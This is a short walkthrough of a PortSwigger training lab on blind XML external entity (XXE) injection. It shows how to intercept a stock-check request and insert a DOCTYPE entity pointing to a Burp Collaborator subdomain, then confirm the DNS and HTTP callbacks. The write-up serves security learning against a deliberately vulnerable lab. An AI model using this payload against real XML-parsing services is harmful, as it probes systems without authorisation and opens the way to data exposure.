## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/7d5917c5-32bc-4a0e-98e2-36961716491d)

## Solution :

Visit a product page, click "Check stock" and intercept the resulting POST request.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/5b04641d-eeaa-40f0-b282-770b4b30319b)

Insert the following external entity definition in between the XML declaration and the stockCheck element.Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated And Replace the productId number ``` &xxe;```

```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/b676fa97-fc10-4b37-800b-14897d1f260f)

Go to the Collaborator tab, and click `"Poll now"`. If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/a4df85b7-8c8b-43eb-9883-9e9f2f028818)

Lab solved.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/492d137c-6ad6-4501-af84-6a21fbf826d2)


